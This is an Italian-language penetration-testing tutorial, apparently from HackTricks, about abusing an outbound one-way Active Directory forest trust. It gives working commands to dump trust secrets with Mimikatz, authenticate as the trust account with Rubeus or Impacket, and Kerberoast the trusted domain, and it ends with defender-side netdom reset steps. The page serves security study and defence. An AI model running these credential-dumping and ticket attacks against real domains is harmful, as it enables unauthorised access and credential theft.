# Dominio di una foresta esterna - Unidirezionale (Outbound)

{{#include ../../banners/hacktricks-training.md}}

In questo scenario **il tuo dominio** sta concedendo **privilegi** ad alcuni **principal** appartenenti a un **dominio/foresta** diverso.

## Enumerazione

### Trust in uscita
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Se hai a disposizione il modulo AD, esamina direttamente anche il **Trusted Domain Object (TDO)**. Questo fornisce i dati grezzi dei trust basati su LDAP di cui avrai bisogno in seguito per decidere se il percorso più semplice sia l'abuso di **FSP/group abuse** o l'abuso di **trust-account**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Dovresti inoltre enumerare dove ai foreign principals provenienti da `CN=ForeignSecurityPrincipals` è stato effettivamente concesso l'accesso. I casi più comuni sono:

- **Local admin** su un server/DC nel dominio corrente
- Appartenenza a un **custom domain group** che dispone di ACL su utenti/computer/GPO
- Diritti per modificare **computer objects**, che in seguito possono diventare [RBCD](resource-based-constrained-delegation.md) se la configurazione della trust lo consente

## Trust Account Attack

Quando viene creato un one-way trust dal dominio/foresta **B** al dominio/foresta **A** (**B trusts A**), in **A** viene creato un **trust account** per **B**. Nella vista outbound-trust di **A**, questo è utile perché, se in seguito comprometti **B** (il trusting side), puoi eseguire il dump del trust secret lì e autenticarti nuovamente verso **A** come `B$`.<sup>[[1]](#references)</sup>

L'aspetto fondamentale da comprendere è che la password e il materiale Kerberos per quel trust account possono essere estratti da un Domain Controller nel dominio **trusting** utilizzando:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Questo funziona perché l'account di trust creato nel dominio **trusted** è un principal abilitato che finisce per avere i diritti di base di un normale utente di dominio al suo interno. Spesso questo è sufficiente per iniziare a enumerare LDAP, richiedere ticket e trovare il successivo percorso di escalation.<sup>[[1]](#references)</sup>

In uno scenario in cui `ext.local` è il dominio **trusting** e `root.local` è il dominio **trusted**, all'interno di `root.local` viene creato un account utente denominato `EXT$`. Il dumping delle trust keys da `ext.local` rivela credenziali che possono essere utilizzate come `root.local\EXT$` contro `root.local`:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Seguendo questa procedura, usa la chiave **RC4** estratta per autenticarti come `root.local\EXT$` all'interno di `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Quindi enumera il dominio trusted come tale principal, ad esempio eseguendo Kerberoasting su uno SPN di alto valore in `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Da Linux

Se hai recuperato la chiave **RC4** dell'account di trust, lo stesso approccio funziona da Linux con Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Se **RC4** non è accettato, usa come fallback la **cleartext password** recuperata (o le chiavi **AES** derivate) e riutilizza i consueti workflow [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) e [Kerberoast](kerberoast.md) da quel foothold.

### Problemi comuni del key material

Non confondere le **trust keys** con le **trust-account credentials**:<sup>[[1]](#references)</sup>

- In una one-way trust, entrambi i lati archiviano un **TDO**, ma l'account utente **`EXT$`** effettivo esiste solo nel trusted domain.
- La password attuale del trust account è riportata nel trust secret del TDO (`NewPassword` / current trust key).
- La trust key **RC4** è l'artefatto più semplice da riutilizzare con `asktgt` come trust account; nelle configurazioni predefinite, questo è solitamente l'enctype funzionante, perché il trust account ha spesso un `msDS-SupportedEncryptionTypes` vuoto.
- Se stai ragionando in termini di **AES trust keys**, ricorda che non sono intercambiabili con le AES keys del trust account perché i salt sono diversi.

Quindi, per la tecnica descritta in questa pagina, preferisci il materiale **RC4** estratto oppure la password **cleartext** recuperata.<sup>[[1]](#references)</sup>

### Raccolta della trust password in cleartext

Nel flusso precedente veniva usato l'hash del trust invece della **cleartext password** (che viene anch'essa **dumped da mimikatz**).<sup>[[1]](#references)</sup>

La password cleartext può essere ottenuta convertendo in esadecimale l'output \[ CLEAR ] di mimikatz e rimuovendo i null byte `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Raccolta della trust password in cleartext: la password cleartext può essere ottenuta convertendo in esadecimale l'output ( CLEAR ) di mimikatz e rimuovendo i null...](<../../images/image (938).png>)

A volte, durante la creazione di una trust relationship, l'utente deve digitare una password per il trust. In questa dimostrazione, la key è la password trust originale e quindi leggibile. Quando la key ruota (predefinito: ogni 30 giorni), la cleartext normalmente smette di essere leggibile, ma rimane comunque tecnicamente utilizzabile.<sup>[[1]](#references)</sup>

La password cleartext può essere usata per eseguire una normale autenticazione come trust account, in alternativa alla richiesta di un TGT con la secret key Kerberos del trust account. Qui, viene interrogato `root.local` da `ext.local` per ottenere i membri di `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Raccolta della trust password in cleartext: la password cleartext può essere usata per eseguire una normale autenticazione come trust account, in alternativa alla richiesta di un TGT...](<../../images/image (792).png>)

### Limitazioni pratiche

> [!WARNING]
> I trust account sono principal scomodi. Gli interactive logon come **RUNAS / console / RDP** non sono il percorso previsto, e i tentativi di autenticazione **NTLM** possono fallire con `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. È preferibile pianificare **Kerberos network logon** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Nota su persistence / cleanup

Se i defender si accorgono che il trusting domain è stato compromesso, dovrebbero ruotare il trust secret su **entrambi i lati** con `netdom trust ... /resetOneSide ...`. Dal punto di vista dell'operator, questo è importante perché un **manual reset invalida immediatamente il vecchio trust material**, mentre la normale rotazione della trust password mantiene i valori corrente/precedente durante il rollover.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Riferimenti

- [1] [Filtro SID come confine di sicurezza tra domini? (Parte 7) – Trust account attack – da trusting a trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Reimpostazione della password di un trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
